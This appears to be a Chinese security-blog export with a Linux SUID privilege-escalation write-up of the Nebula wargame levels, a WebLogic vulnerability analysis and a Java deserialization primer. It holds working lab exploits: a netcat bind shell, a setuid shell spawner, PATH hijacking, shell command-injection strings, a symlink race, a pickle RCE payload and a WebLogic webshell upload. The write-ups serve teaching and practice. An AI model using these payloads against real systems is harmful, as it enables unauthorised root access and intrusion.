    <content type="text"><![CDATA[linux suid提权做了nebula的练习之后，发现其基本都是利用suid程序漏洞进行提权，这里特此做个总结 linux特殊权限在linux权限当中，除了rwx三种基本权限之外，还有三种特殊权限，SUID、SGID、SBIT三种,例如以下: 123[nyrae@iZwz97s22su2pupywkv2a5Z /]$ ll -d /tmp; ll -l /usr/bin/passwd;drwxrwxrwt. 9 root root 4096 8月 30 03:13 /tmp-rwsr-xr-x. 1 root root 27832 6月 10 2014 /usr/bin/passwd SUID即SET UID权限，其只出现于二进制文件拥有者执行权限x上，标注为s，其作用是如果执行者有其对应执行权限x，那么在程序运行过程中，程序将获得程序拥有者的权限 举个例子: 1234567[nyrae@iZwz97s22su2pupywkv2a5Z ~]$ ll /usr/bin/passwd-rwsr-xr-x. 1 root root 27832 6月 10 2014 /usr/bin/passwd[nyrae@iZwz97s22su2pupywkv2a5Z ~]$ ll /etc/shadow---------- 1 root root 1038 6月 9 17:24 /etc/shadow我们可以看到 passwd命令有s权限，且owner为root，其他用户有x执行权限，而/etc/shadow默认全0，所以当我们以用户(nyrae)权限去执行passwd设置密码时，其会暂时获取root权限，然后向/etc/shadow中写入hash值 注意的是，s权限只有二进制程序有效，shell脚本或目录是无效的，因为这个权限的存在，如果程序有漏洞可以被利用，我们就可以通过此方式获取更高的权限，例如如果owner 为root的二进制程序有set uid权限，且存在任意命令执行，那么我们就可以通过这个程序进行root提权，具体的在后面讨论 SGID &amp; SBIT# SGID同SUID,是在owner的x权限上有s标志，那么如果在群组x权限上的s标志，即为SET GID权限，即SGID,可以合理推测，是二进制程序在执行期间获取群组的权限支持。 123[root@study ~]# ll /usr/bin/locate /var/lib/mlocate/mlocate.db-rwx--s--x. 1 root slocate 40496 Jun 10 2014 /usr/bin/locate-rw-r-----. 1 root slocate 2349055 Jun 15 03:44 /var/lib/mlocate/mlocate.db 例如，上面的例子，locate程序具有SGID权限，其他用户(nyrae)有执行权限，当执行时，可以去读取mlocate.db的内容 当SGID用在目录上时，也是一种常见的操作，如果使用者对于此目录有进入权限(r、x)，使用者在此目录下的有效群组将变为目录的群组，即，若此用户可以在此目录下创建文件，则所创建的文件群组为目录群组用户。 # SBITSticky Bit只针对目录有效，其作用是在其目录中，使用者只能对自己创建的文件或目录进行删除/更名/移动等动作，而无法删除他人的文件，最为常见的就是tmp目录 12[nyrae@iZwz97s22su2pupywkv2a5Z ~]$ ll -d /tmpdrwxrwxrwt. 9 root root 4096 8月 30 03:13 /tmp 很容易理解，在/tmp中，每个用户只能操作自身创建的文件或目录 利用SUID提权因为SUID的独特性，我们之前也说了，如果SUID的程序owner为root且程序存在漏洞，我们就可以通过这个方式进行提权利用。 首先，查找可以owner为root且suid的二进制文件。 12345678910111213141516171819[nyrae@iZwz97s22su2pupywkv2a5Z ~]$ find / -user root -perm -4000 2&gt;/dev/null/usr/lib64/dbus-1/dbus-daemon-launch-helper/usr/bin/chfn/usr/bin/at/usr/bin/passwd/usr/bin/gpasswd/usr/bin/sudo/usr/bin/crontab/usr/bin/su/usr/bin/chage/usr/bin/mount/usr/bin/umount/usr/bin/chsh/usr/bin/pkexec/usr/bin/newgrp/usr/lib/polkit-1/polkit-agent-helper-1/usr/sbin/pam_timestamp_check/usr/sbin/usernetctl/usr/sbin/unix_chkpwd 这是在我的阿里云主机上得到的结果，一些其他的系统或版本提供的suid程序不尽相同，可能要具体去看，对于网上的一些可用来提权的linux可执行文件，除了和版本有关，其主要依赖于管理员配置错误，将一些常见的程序加上了suid权限: 12345678Nmap (低版本2.02-5.21可直接使用 --interactive进入交互模式 使用!sh进行提权)find (如果find以suid运行，可以使用 find test -exec whami \;方式运行，或 find test -exec netcat -v -l 22222 -e /bin/bash \;反弹shell)vim (:shell)bash (bash -p)lessmorecpnano 同时利用一些其他的suid程序，通过分析其漏洞，利用提权。具体的利用，根据环境不同而异。 渗透测试练习 —— nebula官方地址 在这里，也可以使用ichunqiu的靶机 总共分了20关，以levelXX的形式进行。 注: ichunqiu 上的问题描述有些问题 可以去官网看 这里所有的程序，基本都是利用suid程序漏洞进行提权，也算是作为linux suid提权的一个练习。 level00 寻找将以flag00运行的suid程序 推测为find查找特权文件: 123456789101112131415161718192021222324252627282930313233343536find[跟时间有关]find / -mtime 4find / -mtime +4[跟使用者和群组有关] -uid n ：n 为数字，这个数字是使用者的帐号 ID，亦即 UID ，这个 UID 是记录在 /etc/passwd 里面与帐号名称对应的数字。这方面我们会在第四篇介绍。 -gid n ：n 为数字，这个数字是群组名称的 ID，亦即 GID，这个 GID 记录在 /etc/group，相关的介绍我们会第四篇说明～ -user name ：name 为使用者帐号名称喔！例如 dmtsai -group name：name 为群组名称喔，例如 users ； -nouser ：寻找文件的拥有者不存在 /etc/passwd 的人！ -nogroup ：寻找文件的拥有群组不存在于 /etc/group 的文件！ 当你自行安装软件时，很可能该软件的属性当中并没有文件拥有者， 这是可能的！在这个时候，就可以使用 -nouser 与 -nogroup 搜寻。[跟文件权限有关] -name filename：搜寻文件名称为 filename 的文件； -size [+-]SIZE：搜寻比 SIZE 还要大（+）或小（-）的文件。这个 SIZE 的规格有： c: 代表 Byte， k: 代表 1024Bytes。所以，要找比 50KB 还要大的文件，就是“ -size +50k ” -type TYPE ：搜寻文件的类型为 TYPE 的，类型主要有：一般正规文件 （f）, 设备文件 （b, c）, 目录 （d）, 链接文件 （l）, socket （s）, 及 FIFO （p） 等属性。 -perm mode ：搜寻文件权限“刚好等于” mode 的文件，这个 mode 为类似 chmod 的属性值，举例来说， -rwsr-xr-x 的属性为 4755 ！ -perm -mode ：搜寻文件权限“必须要全部囊括 mode 的权限”的文件，举例来说， 我们要搜寻 -rwxr--r-- ，亦即 0744 的文件，使用 -perm -0744， 当一个文件的权限为 -rwsr-xr-x ，亦即 4755 时，也会被列出来， 因为 -rwsr-xr-x 的属性已经囊括了 -rwxr--r-- 的属性了。 -perm /mode ：搜寻文件权限“包含任一 mode 的权限”的文件，举例来说，我们搜寻 -rwxr-xr-x ，亦即 -perm /755 时，但一个文件属性为 -rw------- 也会被列出来，因为他有 -rw.... 的属性存在！[其他额外动作]-exec command ：command 为其他指令，-exec 后面可再接额外的指令来处理搜寻到的结果 所以我们可以通过: 123find / -user flag00 -perm /4000 2&gt;/dev/null其中2为标准错误输出，1为标准输出，0为标准输入 /dev/null为黑洞文件 只有输入 或 1fiind / -user flag00 -perm /4000 -exec ls -l &#123;&#125; \; 2&gt;/dev/null 得到/bin/.../flag00文件，运行，然后提示运行getflag程序，运行之后，提示已经在target 账户已生成flag，在~里面找了好久没找到，最后才发现~的绝对路径是/home/level0 level01 以level01登录账户，在/home/flag01里面找 在相应路径中发现一个二进制文件，我们使用ll /bin/getflag发现，使用权限必须是root，而flag01的权限时suid，即执行时可获得其程序拥有者的权限，其中flag01源码如下： 123456789101112int main(int argc, char **argv, char **envp)&#123; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); system("/usr/bin/env echo and now what?");&#125; 我们发现其使用了/usr/bin/env 使用env来运行好处的原因是它会根据你的环境寻找并运行默认的版本，提供灵活性，所以这里的思路是，想办法去修改$PATH使用找到的echo是我们的getflag文件，这样在运行时，其有root权限，则可以getflag成功。于是，我们首先创建一个echo链接到getflag： 1ln -s /bin/getflag /tmp/echo 然后去修改$PATH内容: 1234567891011121314151617181920$PATH 环境变量修改[临时修改 export]export PATH = /usr/bin/sm:$PATH立即生效, 临时改变，只能在当前的终端窗口中有效，当前窗口关闭后就会恢复原有的path配置[永久生效 修改用户]修改 ~/.bashrc 最后加上export PATH=/usr/bin/sm:$PATH使用source 生效永久有效，仅对当前用户[永久生效 所有用户]修改/etc/profileexport PATH=/usr/bin/sm:$PATH重启生效 ，永久有效，所有用户[永久生效 所有用户]修改 /etc/environmentexport PATH=/usr/bin/sm:$PATH重启生效 ，永久有效，所有用户 于是我们修改path内容export PATH=/tmp:$PATH然后运行./flag01发现生成了flag内容，发现其权限为: 1-r--r----- 1 flag01 flag01 15 2016-08-17 01:21 flag 只有flag01用户才可以读取，所以我们利用之前的思路，在tmp下生成一个test.c，然后运行gcc -o echo test.c,内容为下: 12345678910#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main()&#123; setuid(0); setgid(0); execl("/bin/sh","sh",(char *)0); return 0;&#125; 其返回一个shell，使用whoami可以看到当前用户为flag01，则可以查看flag内容。 level02 同样，以下代码存在任意代码执行，找到并获取flag 1234567891011121314151617181920int main(int argc, char **argv, char **envp)&#123; char *buffer; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); buffer = NULL; asprintf(&amp;buffer, "/bin/echo %s is cool", getenv("USER")); printf("about to call system(\"%s\")\n", buffer); system(buffer);&#125; 直接运行看下程序逻辑: 123level02@nebula:/home/flag02$ ./flag02about to call system("/bin/echo level02 is cool")level02 is cool 可以看到其根据$USER内容进行输出，然后将/bin/echo $USER is cool内容执行，很容易想到使用;进行截断，然后执行任意代码，即修改$USER内容为export USER=;getflag 同level01，依旧无法读flag内容，根据同样的思路，尝试你返回shell。 12345678level02@nebula:/home/flag02$ export USER=";/bin/sh;echo"level02@nebula:/home/flag02$ ./flag02about to call system("/bin/echo ;/bin/sh;echo is cool")sh-4.2$ whoamiflag02sh-4.2$ cat /home/flag02/flagflag&#123;YACMD5MYX&#125;sh-4.2$ 于是得到flag内容 level03 flag03中有定时任务 在/home/flag03中 题目说有个定时任务，crontab -l没有发现，难道是其他用户执行的？去看一下所有的crontab任务，uname -a可以看到是ubuntu，所以用户定时任务应该在/var/spool/cron/crontabs中，发现没权限，切换至root（官网在介绍时说可以使用nebula-nebula切换到root）。。ichunqiu这个靶机切不成，思路终结，我们来看下脚本内容。 可以看到有个writable.sh文件内容如下: 123456#!/bin/shfor i in /home/flag03/writable.d/* ; do (ulimit -t 5; bash -x "$i") rm -f "$i"done 按题目说的，推测应该是定时几分钟，然后执行这个脚本，脚本内容依次执行writable.d文件夹里的内容，限制时间5s，执行完后删除，而writable.d中的内容是可以被任何人写入的，所以我们的思路应该是构造sh脚本，然后将flag内容输出到/tmp这样都能读到。 12#!/bin/sh/bin/cat /home/flag03/flag &gt; /tmp/flag03 过一阵，即可查看/tmp/flag03中flag内容 level04 需要bypass 读到token 12345678910111213141516171819202122232425262728int main(int argc, char **argv, char **envp)&#123; char buf[1024]; int fd, rc; if(argc == 1) &#123; printf("%s [file to read]\n", argv[0]); exit(EXIT_FAILURE); &#125; if(strstr(argv[1], "token") != NULL) &#123; printf("You may not access '%s'\n", argv[1]); exit(EXIT_FAILURE); &#125; fd = open(argv[1], O_RDONLY); if(fd == -1) &#123; err(EXIT_FAILURE, "Unable to open %s", argv[1]); &#125; rc = read(fd, buf, sizeof(buf)); if(rc == -1) &#123; err(EXIT_FAILURE, "Unable to read fd %d", fd); &#125; write(1, buf, rc);&#125; 很明显，需要绕过的点是strstr里面，一开始思考以为是像0字节截断之类的，但好像不行，最后想到链接，由于后面是直接将argv[1]作为文件名打开的，所以可以使用链接 123level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/flag04level04@nebula:/home/flag04$ ./flag04 /tmp/flag0406508b5e-8909-4f38-b630-fdb148a848a2 即可读到token，然后使用token作为flag04的密码登陆，拿到flag level05 寻找脆弱的目录权限 文件下有两个目录.ssh与.backup, 推测这道题应该是拿到私钥登陆，而.ssh文件没有权限进入，转而查看备份文件，解压文件，发现当前路径下没有写权限，于是写到/tmp目录下。 12345level05@nebula:/home/flag05/.backup$ tar zxvf backup-19072011.tgz -C /tmp.ssh/.ssh/id_rsa.pub.ssh/id_rsa.ssh/authorized_keys 然后我们使用私钥登陆，即可查看flag内容 12345678910111213141516level05@nebula:/tmp/.ssh$ ssh -i id_rsa flag05@172.16.12.2The authenticity of host '172.16.12.2 (172.16.12.2)' can't be established.ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '172.16.12.2' (ECDSA) to the list of known hosts. _ __ __ __ / | / /__ / /_ __ __/ /___ _ / |/ / _ \/ __ \/ / / / / __ `/ / /| / __/ /_/ / /_/ / / /_/ / /_/ |_/\___/_.___/\__,_/_/\__,_/ exploit-exercises.com/nebulaFor level descriptions, please see the above URL. level06 flag06的凭证来自传统的unix系统 看题目描述，猜测可能凭证可猜解或可破解。/home/flag06没有东西，于是查看/etc/passwd，按理说，由于/etc/passwd可以被所有人看到，不应该在其中有口令信息，而使用x来占位表示在/etc/shadow当中存储真正口令(shadow只有root才能看到)，但由于来源于古老的unix系统，flag06的口令存在于/etc/passwd中 1flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh 使用john进行破解，得到密码hello level07 允许ping任意host 123456789101112131415161718192021#!/usr/bin/perluse CGI qw&#123;param&#125;;print "Content-type: text/html\n\n";sub ping &#123; $host = $_[0]; print("&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;"); @output = `ping -c 3 $host 2&gt;&amp;1`; foreach $line (@output) &#123; print "$line"; &#125; print("&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;");&#125;# check if Host set. if not, display normal page, etcping(param("Host")); 看了代码很容易想到传入的host可以造成任意命令执行。最主要对perl不是很熟，在thttpd.conf文件中可以看到端口为7007所以访问的方式为http://172.16.12.2:7007/index.cgi?Host=xxx 尝试访问http://172.16.12.2:7007/index.cgi?Host=127.0.0.1可以看到反悔了结果，于是尝试构造: 1http://172.16.12.2:7007/index.cgi?Host=127.0.0.1%3Bcat+/home/flag07/flag+ 注意这里要使用+来代替空格，得到flag值 level08 同样读文件的限制，想办法绕过 查看/home/flag08路径，发现有两个可能存在问题的内容，.cache/和capture.pcap，.cache文件无法访问，但看到了pcap包，猜测是分析数据包流量得到密钥。 可以根据hex内容推测得出密码:backd00Rmate 从而登陆flag08得到flag值 level09 php代码存在漏洞 1234567891011121314151617181920212223242526&lt;?phpfunction spam($email)&#123; $email = preg_replace("/\./", " dot ", $email); $email = preg_replace("/@/", " AT ", $email); return $email;&#125;function markup($filename, $use_me)&#123; $contents = file_get_contents($filename); $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents); $contents = preg_replace("/\[/", "&lt;", $contents); $contents = preg_replace("/\]/", "&gt;", $contents); return $contents;&#125;$output = markup($argv[1], $argv[2]);print $output;?&gt; 分析一下代码，其匹配[email cc@xx.com]转变为cc AT xx DOT com，其中使用了/e模式，此模式会将替换串作为代码执行，那么很明显这里存在任意代码执行。 其漏洞是: 12345678在php中，字符串""中使用$xx或者$&#123;xx&#125; 如果xx为变量，则返回变量值，如果为函数，则返回函数计算结果，例如以下内容,会返回phpinfo信息:xiaokunhuang@XiaokundeMacBook-Pro  ~/Desktop  php test.php | head -n 5phpinfo()PHP Version =&gt; 7.1.14System =&gt; Darwin XiaokundeMacBook-Pro.local 17.5.0 Darwin Kernel Version 17.5.0: Mon Mar 5 22:24:32 PST 2018; root:xnu-4570.51.1~1/RELEASE_X86_64 x86_64Build Date =&gt; Feb 7 2018 18:24:13 level10 任意文件上传代码，其中满足acess系统调用 这道题程序大致意思是，首先判断传入的文件是否有读权限，如果有将其内容发送到host的18211端口，这里使用access来判断是否有读权限。其中这个access在手册中有这么一段话： Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided. 即不推荐使用access判断权限再使用open打开，由于时间差从而容易被攻击，所以思路就是在第一次文件权限判断的时候，指向一个/tmp/token文件，这是我们level10创建的且具有读权限的文件，然后再open的时候，将它指向我们的/home/flag10/token文件，由于二进制程序有s标志，从而可以读取内容，发送给我们监听的18211端口，得到token值。 由于我们没有办法做到手动在程序执行期间更改其指向，所以我们用while循环来让其不停的变化，直到得到结果。 所以我们首先在本地监听18211端口，并将内容持续输出到文件中。（这里我们从官网下了虚拟机本地运行的，ichunqiu哪个没法监听） 1while true; do nc -vv -l 18211 &gt;&gt; out; done 之后我们 1while true; do ln -fs /tmp/token /tmp/test; ln -fs /home/flag10/token /tmp/test;done &amp; 之后运行 1while true; do /home/flag10/flag10 /tmp/test 10.211.55.2; done 最后查out即可得到615a2ce1-b2b5-4c76-8eed-8aa5c4015c27 之后即可登录查看 再补充一点，access是使用进程运行的用户的权限去判断的，而open运行时，使用的是s之后的权限去运行的。 level11 同样任意命令执行 找到system函数，发现其执行了buffer中的内容，推测构造buffer数据进行绕过，且buff内容对在执行前做过了处理,所以推测方法为倒序执行解密即可。 level12 存在一个50001端口的后门 我们看下程序，发现其判断password的hash值的1-40为是不是和给定的相同，可以通过构造hash值，不过会死人。我们看到其执行命令时，拼接了passwd，则很明显存在任意命令执行漏洞。 1;/bin/getflag &gt; /tmp/123 level13 其会检查运行程序时的uid是否为1000 这道题考察反汇编知识，即在运行时我去们修改$eax寄存器中的值，这个值即为1014即level13的uid值，我们通过修改其值为1000进行绕过，流程如下： 首先是反编译flag13文件 1gdb flag13 之后反编译main函数 1disassemble main 看到: 120x080484ef &lt;+43&gt;: call 0x80483c0 &lt;getuid@plt&gt;0x080484f4 &lt;+48&gt;: cmp $0x3e8,%eax 应该是判断$eax寄存器中的内容和0x3e8是否相等，即是否为1000，我们在这里设置断点: 1break *0x080484f4 之后我们运行run程序，会发现其停到断点处，修改之后在continue: 123456789101112131415(gdb) break *0x080484f4Breakpoint 1 at 0x80484f4(gdb) runStarting program: /home/flag13/flag13Breakpoint 1, 0x080484f4 in main ()(gdb) print $eax$1 = 1014(gdb) set $eax=1000(gdb) print $eax$2 = 1000(gdb) continueContinuing.your token is b705702b-76a8-42b0-8844-3adabbe5ac58[Inferior 1 (process 16725) exited with code 063] 可以看到得到了token值 level14 破解加密程序 随便输入： 123456level14@nebula:/home/flag14$ ./flag14 -e123456789013579;=?A9level14@nebula:/home/flag14$ ./flag14 -eabcdefsdacegikyk 推测为char(i)+index(i)的值，写个程序解密token即可 level15动态链接库劫持，不太明白，之后在深入研究 level16 perl 1616端口 web认证 代码如下: 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env perluse CGI qw&#123;param&#125;;print "Content-type: text/html\n\n";sub login &#123; $username = $_[0]; $password = $_[1]; $username =~ tr/a-z/A-Z/; # conver to uppercase $username =~ s/\s.*//; # strip everything after a space @output = `egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1`; foreach $line (@output) &#123; ($usr, $pw) = split(/:/, $line); if($pw =~ $password) &#123; return 1; &#125; &#125; return 0;&#125;sub htmlz &#123; print("&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;"); if($_[0] == 1) &#123; print("Your login was accepted&lt;br/&gt;"); &#125; else &#123; print("Your login failed&lt;br/&gt;"); &#125; print("Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n");&#125;htmlz(login(param("username"), param("password"))); 我们可以看到，整个流程大概是首先去获取username和password的值，然后对username进行大写之后在去除空格之后的所有内容，之后调用调用系统调用去处理，可以看到，很明显是一个任意代码执行的漏洞，不过要绕过username的处理。 egrep用于在文件内进行内容查找,而由于username中会被变成大写，于是需要利用一个技巧，shell中转为小写： 123level16@nebula:~$ test=ASNDSAlevel16@nebula:~$ echo $&#123;test,,&#125;asndsa 使用${x,,}的方式可以使命令转为小写。于是我们构造username为: 1"&lt;/DEV/NULL;CMD=/TMP/LEVEL16;$&#123;CMD,,&#125;;# 其中&quot;用于闭合，#用于注释后面的语句，其中我们需要新建一个/tmp/level16文件，内容如下，且设置为可执行: 123#!/bin/bash/bin/getflag &gt; /tmp/getflag16 之后访问提交即可 level17 攻击python脚本 看到pickle，很明显，应该是反序列化问题，与传统的对象反序列化不同，python反序列化可能执行shellcode,除了可以序列化对象，也可以通过操作码，反序列化出代码： 想要使用模块，则用操作码c，比如这关要使用到os模块，则：cos;如果要使用python内置函数，则是：cbuiltin。 想要使用一个字符串，则S’字符串’ 想要把参数带入“栈”中调用函数，则(S’参数’，官方叫它MARK对象 t操作码则是从栈顶开始弹出所有值，包括MARK对象。 R则pop栈顶两项内容最后，”.”代表pickle结束标志。 所以可以新建一个/tmp/sc，内容如下： 1234cossystem(S'getflag&gt;/tmp/level17'tR. 然后传入nc连接即可]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>suid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic 常见漏洞分析]]></title>
    <url>%2Fblog%2Fweblogic%2F</url>
    <content type="text"><![CDATA[WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 WebLogic常用端口7001/7002，常见漏洞有弱口令导致上传任意war包、SSRF漏洞和反序列化漏洞。我们对以下漏洞做了详细的分析： 弱口令 ssrf CVE-2014-4210 反序列化 CVE-2015-4852 WLS 组件远程代码执行 CVE-2017-10271 反序列化 CVE-2018-2628 反序列化 CVE-2018-2894 弱口令导致webshellWebLogic Server 版本: 10.3.6.0Java版本：1.6 后台ip:7001/console, 弱口令为weblogic / Oracle@123 在此版本中，如果存在任意文件下载漏洞，可获取弱AES加密的密钥，从而获得密码。在这里，vulhub提供了一个任意文件下载的漏洞，在/hello/file.jsp?path=xxx这里 利用的原理是这样，weblogic密码使用对称加密，密钥存储于/security/SerializedSystemIni.dat，而加密后的密钥存储于/config/config.xml所以通过任意文件下载，可以解密密码。 最后解密得到Oracle@123 上传webshell由于可以进入后台管理，则可以安装任意web应用，这里我建了webapp，然后把内容替换成jsp一句话木马，传上去可以看到: SSRF CVE-2014-4210影响版本:10.0.2、10.3.6 这个漏洞存在于weblogic 内置自带的uddiexplorer中，是用于web service查询与定位的。 Universal Description, Discovery and Integration (UDDI) is a platform-independent, Extensible Markup Language protocol that includes a (XML-based) registry by which businesses worldwide can list themselves on the Internet, and a mechanism to register and locate web service applications. UDDI is an open industry initiative, sponsored by the Organization for the Advancement of Structured Information Standards (OASIS), for enabling businesses to publish service listings and discover each other, and to define how the services or software applications interact over the Internet. 通过访问http://192.168.218.128:7001/uddiexplorer/SearchPublicRegistries.jsp可以看到有一个搜索界面，其中的operator字段存在SSRF漏洞： 修改端口和IP可以用来内网扫描。 之后涉及的漏洞都跟 java 反序列化有关，关于java序列化相关内容，可以看我的这篇文章Java 序列化与反序列化 &amp; 反序列化漏洞相关。PHP的反序列化及漏洞在PHP反序列化相关漏洞总结阐述过，原理与java一致，推荐两个进行对比，可以发现设计的思路都是一致的。 反序列化 CVE-2015-4852当年apache commons collections出来的时候，横扫了各种java web容器，weblogic也不例外，关于漏洞的原理，可以参考我的上篇文章，做了极致详细的分析Java 序列化与反序列化 &amp; Apache Commons Collections反序列化漏洞 根据之前的分析可以知道，我们利用的条件有2个: 使用了apache commons collections 3.2.1以下版本 有地方接收反序列化对象 发现在weblogic一些版本中，可以通过T3协议向7001端口发送数据，会包含反序列化内容，从而可以被我们利用。这里我们使用官方的POC，(也可直接将之前文章的payload复制) 我们发送t3数据如下: 之后我们发送我们的payload 我们可以看到，其命令为ping 192.168.253.130: 最终监测发现命令执行成功:]]></content>
      <categories>
        <category>vulnerability analysis</category>
      </categories>
      <tags>
        <tag>vulnerability analysis</tag>
        <tag>web security</tag>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java 序列化与反序列化 & Apache Commons Collections反序列化漏洞]]></title>
    <url>%2Fblog%2Fjava-deserialization%2F</url>
    <content type="text"><![CDATA[java 序列化与反序列化简单例子首先我们来看下简单的例子: 123456789101112131415161718public static void main( String[] args) throws Exception&#123; String s = "abcd是我啊"; int i = 5; FileOutputStream sfos= new FileOutputStream("string.out"); FileOutputStream ifos= new FileOutputStream("int.out"); ObjectOutputStream soos = new ObjectOutputStream(sfos); ObjectOutputStream ioos = new ObjectOutputStream(ifos); soos.writeObject(s); ioos.writeObject(i); soos.close(); ioos.close(); FileInputStream fis = new FileInputStream("string.out"); ObjectInputStream ois = new ObjectInputStream(fis); String obj = (String) ois.readObject(); System.out.println(obj);&#125; 根据结果我们可以看到，序列化了2个，一个String一个int. 先看string:0x ACED作为序列化的标识符0x 0005作为序列化版本号，这些都是常量，定义在Constants中。0x 74表示String类型0x 000Dstring长度 为13字节0x 61626364 E698AFE6 8891E595 8A后面对应于内容的UTF-8编码值。 而int序列化0x 73表示TC_OBJECT0x 74表示TC_CLASSDESC(class描述符)0x 11表示描述符长度，对应java.lang.Integer0x 12E2A0A4 F7818738为SerialVersionUID，如果不指定，会随机生成8字节uid0x 02为标记号. 该值声明该对象支持序列化0x 0001 表示域个数0x 49 表示域类型 对应I 表示Integer0x 0005 域名字长度0x 76616C75 65 对应域名字描述value0x 78 对应于TC_ENDBLOCKDATA 表示对象块结束…0x 78 对应于TC_ENDBLOCKDATA 表示对象块结束0x 70 对应于TC_NULL 表示没有超类了0x 0000 0005 对应值5 其中的Constants字段值可以参考java.io.ObjectStreamConstants 复杂例子之前的例子使用的都是java常见的内部类，如果复杂一点呢？如果是我们自己定义的class，只需要实现Serializable接口即可。Serializable接口中没有任何方法，可以理解为一个标记，即表明这个类可以序列化。例如: 123456789101112131415161718192021222324252627282930public class Test implements Serializable &#123; private static final long serialVersionUID= 305419896L; private String name; private int age; private long date; public Test(String name, int age)&#123; this.name = name; this.age = age; this.date = new Date().getTime(); &#125; @Override public String toString() &#123; return "Test&#123;" + "name='" + name + '\'' + ", age=" + age + ", date=" + date + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; ...&#125; 序列化后的结果如下: 我们可以看到，我们指定了uid之后，其值为12345678. 关于字段的详细含义，可以看这篇文章Object Serialization Stream Protocol 极其推荐！极其推荐！极其推荐！ 这里引用一些比较关键的点: 1234567891011121314A basic structure is needed to represent objects in a stream.Each attribute of the object needs to be represented: its classes, its fields, and data written and later read by class-specific methods.The representation of objects in the stream can be described with a grammar.There are special representations for null objects, new objects, classes, arrays, strings, and back references to any object already in the stream.Each object written to the stream is assigned a handle that is used to refer back to the object.Handles are assigned sequentially starting from 0x7E0000. The handles restart at 0x7E0000 when the stream is reset.New objects in the stream are represented by the following: The most derived class of the object. Data for each serializable class of the object, with the highest superclass first. For each class the stream contains the following:The serializable fields.See Section 1.5, "Defining Serializable Fields for a Class."If the class has writeObject/readObject methods, there may be optional objects and/or block-data records of primitive types written by the writeObject method followed by an endBlockData code. 其中的Rules of the Grammar可以仔细看下。 serialVersionUID随着项目的更新，不同的serialVersionUID被认为是不同的class版本，在反序列化中可能会报错。如果手动设置UID，可以遵守以下规则： 1234567只修改了类的方法，无需改变serialVersionUID；只修改了类的static变量和使用transient 修饰的实例变量，无需改变serialVersionUID；如果修改了实例变量的类型，例如一个变量原来是int改成了String,则反序列化会失败，需要修改serialVersionUID；如果删除了类的一些实例变量，可以兼容无需修改；如果给类增加了一些实例变量，可以兼容无需修改，只是反序列化后这些多出来的变量的值都是默认值。[注]1. 如果不想把变量序列化 可以加 transient字段2. 序列化对象 父类和其引用也必须可以序列化 序列化引用在之前，提到每个序列化后的stream都会分配一个handler值，从0x 007E 0000开始，当同一类的不同对象再序列化时，其会首先查看原始是否存在，如果存在则直接引用，不会再去重新生成一个。 自定义序列化writeObject &amp; readObject在序列化和反序列化过程中，我们可以实现: 12private void writeObject(ObjectOutputStream out)private void readObject(ObjectInputStream in) 来完全控制序列化和反序列化的过程 ObjectOutputStream先通过反射在要被序列化的对象的类中查找有无自定义的writeObject方法，若有，则会优先调用自定义的writeObject方法。因为查找反射方法时使用的是getPrivateMethod，所以自定以的writeObject方法的作用域要被设置为private。通过自定义writeObject和readObject方法可以完全控制对象的序列化与反序列化。 当然，我们需要对应write和read的顺序，不然会报错，如图所示，可以看到我们在所Test对象之后附带了一个字符串，且字符串和原始对象均被正常读入处理。类似这种操作一般用于session中，添加session处理时间而不将时间戳信息写入session对象当中。 writeReplace &amp; readResolve这两个方法分别在writeObject和readObject的前、后进行处理，与PHP反序列化中的__sleep &amp; __wakeup类似，都是用于序列化与反序列化前后对对象进行处理的函数 implement Externalizable接口实现Externalizable则序列化反序列化流程完全由我们自己决定: 12public void writeExternal(ObjectOutput out)public void readExternal(ObjectInput in) java反序列化漏洞我们再看下面的例子，由于java反序列化中没有指定反序列化对象的类型，任意对象均可被反序列化，那么在反序列化过程中，如果对象本身有一些函数会自动调用，则会造成任意代码执行。 由于反序列化存在于一些公共库，例如Apache Commons Collections，所以危害影响非常广。 漏洞基本原理 如图，如果我们在readObject代码之后还去执行了一些其他东西，这就是漏洞的基本原理，但可能会想，谁会这样写？但实际上，一些有潜在危险的地方通过精心构造，是可以实现的。 所以一般漏洞产生的条件实现了Serializable接口以及 重写了readObject方法 Apache Commons Collections问题出现在commons-collections这个apache组件当中，其中有个InvokerTransformer存在问题。我们先看一下这个类的内容: 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class InvokerTransformer implements Transformer, Serializable &#123; static final long serialVersionUID = -8653385846894047688L; private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; public static Transformer getInstance(String methodName) &#123; ... &#125; public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args) &#123; ... &#125; private InvokerTransformer(String methodName) &#123; this.iMethodName = methodName; this.iParamTypes = null; this.iArgs = null; &#125; public InvokerTransformer(String 